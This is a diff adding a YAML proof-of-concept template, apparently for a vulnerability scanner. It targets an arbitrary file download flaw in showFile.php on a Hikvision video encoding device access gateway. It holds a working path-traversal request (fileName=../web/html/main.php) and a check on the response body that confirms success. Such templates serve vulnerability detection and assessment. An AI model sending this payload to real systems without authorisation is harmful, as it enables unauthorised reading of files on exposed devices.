@@ -1,0 +1,14 @@
+id: poc-yaml-hikvision-showfile-arbitrary-file-download
+info:
+  name: 海康威视-视频编码设备接入网关-showFile.php-任意文件下载
+  severity: high
+  tags:
+  - 文件读取
+  finger: 视频编码设备接入网关
+requests:
+- method: GET
+  path: /serverLog/showFile.php?fileName=../web/html/main.php
+  expression: status_code == 200 && contains(body, "请输入两位网关编号用于区分各个网关的设备编码") && contains(body,
+    "当前网关编号")
+variables: {}
+transport: http
